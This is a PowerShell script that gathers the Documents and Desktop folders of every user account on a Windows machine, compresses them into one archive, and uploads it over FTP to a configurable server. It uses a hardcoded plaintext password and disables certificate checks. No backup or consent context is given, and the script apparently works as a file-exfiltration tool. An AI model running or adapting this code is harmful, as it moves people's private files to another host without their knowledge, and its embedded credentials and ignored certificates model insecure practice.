Install-Module PSFTP
Import-Module PSFTP

#get the user folders
$user_folders = Get-ChildItem C:\Users | Where-Object {$_.PSIsContainer} | Select-Object -ExpandProperty Name
$all_paths = New-Object System.Collections.Generic.List[System.String]

#concatenates the folders of users that exist
foreach ($folder in $user_folders) {
    $path = "C:\Users\$folder"
    if(Test-Path "$path\Documents") {
        $all_paths.Add("$path\Documents")
    }
    
    if(Test-Path "$path\Desktop"){
        $all_paths.Add("$path\Desktop")
    }
}

#if there are folders to download
if($all_paths) {
    $archive_path = "C:\temp\UserFiles.zip" #archive output path
    foreach($path in $all_paths){
        if(Test-Path -Path $archive_path) {
            Compress-Archive -Path $path -DestinationPath $archive_path -Update
        } else {
            Compress-Archive -Path $path -DestinationPath $archive_path
        }
        
    }
}
else {
    Write-Host "Aucun dossier Documents ou Bureau n'a été trouvé pour les utilisateurs du poste."
}

#set the FTP connection information
$ftpServer = "127.0.0.1" #EDIT
$password = ConvertTo-SecureString "azerty" -AsPlainText -Force #EDIT PASSWORD
$cred = New-Object System.Management.Automation.PSCredential ("noor", $password)

#initiate FTP connection
Set-FTPConnection -Credentials $cred -Server $ftpServer -Session FloFTP -ignoreCert -UseBinary -KeepAlive 
$session = Get-FTPConnection -Session FloFTP

if($session){
    #push the file
    Add-FTPItem -Session $session -Path "/pull/" -LocalPath $archive_path
}